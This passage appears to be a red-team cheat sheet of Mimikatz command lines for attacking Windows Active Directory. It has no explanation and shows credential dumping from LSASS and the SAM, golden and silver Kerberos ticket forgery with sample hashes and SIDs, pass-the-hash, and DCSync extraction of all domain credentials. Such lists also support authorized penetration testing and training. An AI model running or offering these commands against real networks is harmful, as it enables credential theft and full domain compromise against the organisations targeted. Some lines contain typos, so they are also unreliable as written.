###
```
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
mimikatz token::elevate lsadump::sam
mimikatz "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam"
mimikatz "lsadump::sam"
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"'
```
### Golden Tickets
```
 mimikatz kerberos::golden /user:Administrator /domain:ninja.corp /sid:S-1-5-21-3865823697-1816233505-1834004910 /krbtgt:ac548f25225b5e0974a79a59fc27fc2c /target:domain:ninja.corp /ptt
```
```
kerbeos::golden /user:Administrator /krbtgt:HASH_KRBTGT /domain:ninja.corp /sid:S-1-5-21-2941561648-383941485-1389968811 /sids:S-1-5-SID-SECOND-DOMAIN-519 /ptt
```

### Pass-the-Hash  
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain:ninja.corp  /target:ninja.corp /ntlm:a87f3a337d73085c45f9416be5787d86 /ptt "'
```

### Silver Tickets  
```
|kerberos::golden /user:Administrator /domain:testlab.local /sid:S-1-5-21-1516486103-3973840447-1748718438 /target:ninja.corp  /rc4:47b1d9d581f29b3b43845692bd4a0322 /service:cifs /ptt
```
```
mimikatz kerberos::golden /user:Administrator /domain:cyberbotic.io /sid:S-1-5-21-3865823697-1816233505-1834004910 /target:dc-1.cyberbotic.io /service:cifs /rc4:REDACTED /ticket:silver.kirbi
```

### dcsync
```
mimikatz lsadump::dcsync /domain:insomnia.io /all /csv
mimikatz lsadump::dcsync /domain:insomnia.io /user:John
Invoke-DCSync
Invoke-DCSync -PWDumpFormat
```
